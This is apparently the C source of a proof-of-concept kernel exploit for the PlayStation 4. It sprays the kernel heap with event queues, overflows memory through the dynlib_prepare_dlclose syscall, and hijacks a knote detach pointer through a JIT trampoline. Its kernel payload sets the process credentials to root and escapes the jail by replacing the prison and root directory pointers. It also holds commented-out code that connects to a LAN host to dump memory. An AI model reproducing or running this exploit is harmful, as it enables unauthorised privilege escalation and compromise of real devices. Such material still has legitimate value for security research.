#include <stdlib.h>
#include <stdio.h>


#include <sys/mman.h>

#include <kernel.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#define _KERNEL 
#include <sys/selinfo.h>
#include <sys/_lock.h>
#include <sys/_mutex.h>
#include <sys/eventvar.h>
#include <sys/event.h>
#include <sys/queue.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <net.h>
#include <netinet/tcp.h>


#include <debugnet.h>



debugNetConfiguration *conf;
void *trampe = NULL;
int misock;
int misock2;
//uint8_t *dump;
char kprintfbuffer[512];
#define kprintf(format, ...) \
{ \
	int size = sprintf(kprintfbuffer, format, ##__VA_ARGS__); \
	int (*sys_sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10; \
	struct sendto_args args = { \
		misock, \
		kprintfbuffer, \
		size, \
		0, \
		NULL, \
		0 \
	}; \
	sys_sendto(td, &args); \
}


#define PAGESHIFT      14              /* LOG2(PAGE_SIZE) */
#define PAGESIZE       (1<<PAGESHIFT) /* bytes/page */
#define PAGE_SIZE (16 * 1024)




struct sx {
	struct lock_object	lock_object;
	volatile uintptr_t	sx_lock;
};

typedef struct orbis_filedesc {
	uint64_t *unknown;			//0x0 point to orbis_filedesc+0x80 after fdinit
	uint64_t *unknown2;			//0x8  8 point to orbis_filedesc+0x120 after fdinit
	uint64_t *fd_cdir;			//0x10 16
	uint64_t *fd_rdir;			//0x18 24
	uint64_t *fd_jdir;			//0x20 32
	int32_t fdt_nfiles;			//0x28 40 it set to 20 in fdinit so i suppose that name
	int32_t unknown3;			//0x2c 44
	int16_t *unknown4;			//0x30 48 point to orbis_filedesc+0x138 after fdinit
	int32_t fd_lastfile;		//0x38 56 
	int32_t unknown5;			//0x3c	60
	u_short fd_cmask;			//0x40 64
	int16_t fd_refcnt;			//0x42 66
	int16_t fd_holdcnt;			//0x44 68
	int16_t unknown6;			//0x46 70
	struct sx fd_sx;			//0x48  72
	struct	kqlist fd_kqlist;	//0x68 104
	int64_t	unknown7;			//0x78  120
	uint8_t unknown8[160];		//0x80 128
	uint8_t unknown9[24];		//0x120 288
	int16_t unknown10;			//0x138 312
}orbis_filedesc;


struct ucred {
	uint32_t cr_ref;				//0
	uint32_t cr_uid;				//4
	uint32_t cr_ruid;				//8
	uint32_t cr_svuid;				//12
	uint32_t cr_ngroup;				//16
	uint32_t cr_rgid;				//20
	uint32_t cr_svgid;				//24
	uint32_t unknown1;  			//28 
	void *cr_uidinfo;				//32
	void *cr_ruidinfo;				//40
	void *cr_prison;				//48
	void *cr_loginclass;			//56
	//uint8_t unknown2[168];			//64
	uint8_t unknown2[216];			//64
//	struct auditinfo_addr cr_audit;	//232
	uint32_t *cr_groups;			//280
	int32_t cr_agroups;				//288
	int32_t unknown3				//292
};

struct proc {
	char useless[64];				//0
	struct ucred *p_ucred;			//64
	struct orbis_filedesc *p_fd;			//72
};

struct thread {
	void *useless;
	struct proc *td_proc;
};
struct sendto_args {
	int	s;
	void *	buf;
	size_t	len;
	int	flags;
	void *	to;
	int	tolen;
};


// We are in a normal kernel context here
void payload(struct knote *kn) {
	//struct sendto_args args11 = { misock2, dump, 0x1000, 0, NULL, 0 };
	
	
	struct thread *td;
	
	struct ucred *cred;
	// Get td address
	__asm__ volatile("mov %%gs:0,%0": "=r"(td));
	// Resolve creds
	
	
	
	kprintf("[POC] [+] Entered critical payload\n");

	cred=td->td_proc->p_ucred;
	
	kprintf("[POC] [+] cred \n");
	
	cred->cr_uid = 0;
	cred->cr_ruid =0; 
	cred->cr_rgid = 0;
	kprintf("[POC] [+] cred->cr_uid  cred->cr_ruid  cred->cr_rgid set to 0\n");

	cred->cr_groups[0]=0;
	kprintf("[POC] [+] set group0 to 0 \n");
	
	cred->cr_prison=(void *) 0xFFFFFFFF83237250;
	kprintf("[POC] [+] set prison0\n");
	
	struct orbis_filedesc *p_fd = td->td_proc->p_fd;
	
	p_fd->fd_rdir = *(uint64_t *) 0xFFFFFFFF832EF920;
	kprintf("[POC] [+] set rootnode to td_fdp_fd_rdir\n");
	p_fd->fd_jdir = *(uint64_t *) 0xFFFFFFFF832EF920;
	kprintf("[POC] [+] set rootnode to td_fdp_fd_jdir\n");
	kprintf("[POC] [+] exit from payload\n");
	
}
int kernelGetFd()
{
	int sock;
	int fd = 3840;
	sock=0;
	int i=0;
	int sockini=0;
	
	while(sock < fd && sock>=0) {
		sock = socket(AF_INET, SOCK_STREAM, 0);
		if(i==0)
		{
			sockini=sock;
			debugNetPrintf(DEBUG,"[POC] Opening fisrt socket %d \n",sockini);
			i++;
		}
	}
	if(sock<0 || sock!=fd)
	{
		debugNetPrintf(DEBUG,"[POC] Opening socket %d is not yet equals to our fd %d\n",sock,fd);
		
		return -1;
	}
	debugNetPrintf(DEBUG,"[POC] socket opened is now equeals fd %d\n",sock);
	debugNetPrintf(DEBUG,"[POC] cleaning open sockets\n");
	
	for(i=sockini;i<3738;i++)
	{
		close(i);
		//debugNetPrintf(DEBUG,"closing sock %d\n",i);
		
	}
	return sock;	
}
// Perform kernel allocation aligned to 0x800 bytes
uint64_t kernelAllocation(int fd, char * name) {
	
		
	//int queue = kqueue();
	int64_t queue;
	int ret=sceKernelCreateEqueue(&queue,name);
	if(ret!=0)
	{
		debugNetPrintf(ERROR,"[POC] Error creating event queue 0x%08X\n", ret);
		return -1;
	}
	else
	{
		//debugNetPrintf(DEBUG,"[POC] Created event queue 0x%016X\n",queue);
		
	}
	
	
	ret=sceKernelAddReadEvent(queue, fd, 0 , NULL);  
	if(ret!=0)
	{
		debugNetPrintf(ERROR,"[POC] Error adding event queue  0x%08X\n", ret);
		return -1;
	}
	
	
	
	return queue;
}

void kernelFree(uint64_t allocation) {
	int ret	;
	ret=sceKernelDeleteEqueue(allocation);
	if(ret!=0)
	{
		debugNetPrintf(ERROR,"[POC] error sceKernelDeleteEqueue return: 0x%08X\n", ret);
	}
	else
	{
		//debugNetPrintf(DEBUG,"[POC] sceKernelDeleteEqueue return: 0x%08X\n", ret);
		
	}
}
void prefault(void *address, size_t size) {
	uint64_t i;
	for(i = 0; i < size; i++) {
		volatile uint8_t c;
		(void)c;
		
		c = ((char *)address)[i];
	}
}

#define IP(a, b, c, d) (((a) << 0) + ((b) << 8) + ((c) << 16) + ((d) << 24))

void allocatePayload()
{

	// Setup trampoline to gracefully return to the calling thread 
	void *trampw = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {	0x58, // pop rax
					0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
					0x50, // push rax
					0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
					0xFF, 0xE0 // jmp rax
	};

	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_READ | PROT_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(uint64_t*)(trampw + 14) = (uint64_t)payload;
}
void* exploitThread(void *args)
{
	
	
	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;

	uint64_t mappingSize = bufferSize + overflowSize;
	int64_t count = (0x100000000 + bufferSize) / 4;
	uint64_t allocation[100], m, m2,myqueue;
	int ret;
	
	// Spray the heap
	int i;
	char name[32];
	int fd= kernelGetFd();
	if(fd<0)
	{
		return -1;
	}
	int fdaux=3738;
	for(i = 0; i < 100; i++) {
		sprintf(name,"myqueue%d",i);
		myqueue= kernelAllocation(fdaux,name);
		if(myqueue>0)
		{
			allocation[i] =myqueue;
		}
		else
		{
			allocation[i] =0;
			debugNetPrintf(DEBUG,"[POC] error en spray %d\n",i);
			//return -1;
		}
		fdaux++;
	}

	// Create hole for the system call's allocation
	sprintf(name,"queue101");
	
	m = kernelAllocation(3839,name);
	debugNetPrintf(DEBUG,"[POC] m event queue created  0x%08X\n", m);
	sprintf(name,"queue102");
	m2 = kernelAllocation(3840,name);
	debugNetPrintf(DEBUG,"[POC] m2 event queue created  0x%08X\n", m2);

	kernelFree(m);	
	

	uint8_t *mapping = mmap(NULL, mappingSize + PAGESIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	debugNetPrintf(DEBUG,"[POC] mapping pointer %p\n",mapping);
	
	munmap(mapping + mappingSize, PAGESIZE);

	struct knote  kn;
	// struct klist list;
	struct filterops fo;
	// struct klist *overflow=(struct klist *)(mapping + bufferSize);
	struct knote **overflow = (struct knote **)(mapping + bufferSize);

	//for(i = 0; i < overflowSize / sizeof(struct knote *); i++) {
	//	overflow[i] = &kn;
	//}
	overflow[2]=&kn;

	
	kn.kn_fop = &fo;
	
	
	
	
	 
	allocatePayload();
	fo.f_detach = trampe;

	//struct sockaddr_in server;

	//server.sin_len = sizeof(server);
	//server.sin_family = AF_INET;
	//server.sin_addr.s_addr = IP(192, 168, 1, 3);
	//server.sin_port = sceNetHtons(9023);
	//memset(server.sin_zero, 0, sizeof(server.sin_zero));

	//misock2 = sceNetSocket("dumper", AF_INET, SOCK_STREAM, 0);
	//sceNetConnect(misock2, (struct sockaddr *)&server, sizeof(server));
	
	

	// Disable packet queuing
	//int flag = 1;
	//sceNetSetsockopt(misock2, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	
	
	// Allocate and prefault over dump memory
	//dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	//prefault(dump, PAGE_SIZE);
	
	
	
	
	
	debugNetPrintf(DEBUG,"[POC] [+] UID: %d, GID: %d\n",getuid(),getgid());
	debugNetPrintf(DEBUG,"[POC] before SYS_dynlib_prepare_dlclose\n");	
	ret=syscall(SYS_dynlib_prepare_dlclose, 1, mapping, &count);
	debugNetPrintf(DEBUG,"[POC] SYS_dynlib_prepare_dlclose: %d\n", ret);
	debugNetPrintf(DEBUG,"[POC] before sceKernelDeleteEqueue \n");	
	kernelFree(m2);
	debugNetPrintf(DEBUG,"[POC] cleaning spray queues\n");	
	//we clean spray queues
	for(i=0;i<100;i++)
	{
		kernelFree(allocation[i]);	
			
	}
	return NULL;
}

int main(int argc, char *argv[])
{
	int ret;
	uintptr_t intptr=0;
	sscanf(argv[1],"%p",&intptr);
	conf=(debugNetConfiguration *)intptr;
	ret=debugNetInitWithConf(conf);
	misock=conf->SocketFD;
	sleep(3);
	debugNetPrintf(DEBUG,"[POC] argc=%d elfname=%s debugnetconf=%s %p %d\n",argc,argv[0],argv[1],conf,conf->SocketFD);
	
	ScePthread thread;
	
	
	
	debugNetPrintf(DEBUG,"[POC] [+] Starting...\n");
	debugNetPrintf(DEBUG,"[POC] [+] UID = %d\n", getuid());
	
	// Create exploit thread
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		debugNetPrintf(DEBUG,"[POC] [-] scePthreadCreate\n");
		debugNetFinish();
	
		return EXIT_SUCCESS;
	}
	
	// Wait for thread to exit
	scePthreadJoin(thread, NULL);
	
	// At this point we should have root and jailbreak
	if(getuid() != 0) {
		debugNetPrintf(DEBUG,"[POC] [-] Kernel patch failed!\n");
		debugNetFinish();
		return EXIT_SUCCESS;
	}
	debugNetPrintf(DEBUG,"[POC] [+] Kernel patch success!\n");
	
	debugNetFinish();
	return EXIT_SUCCESS;
}
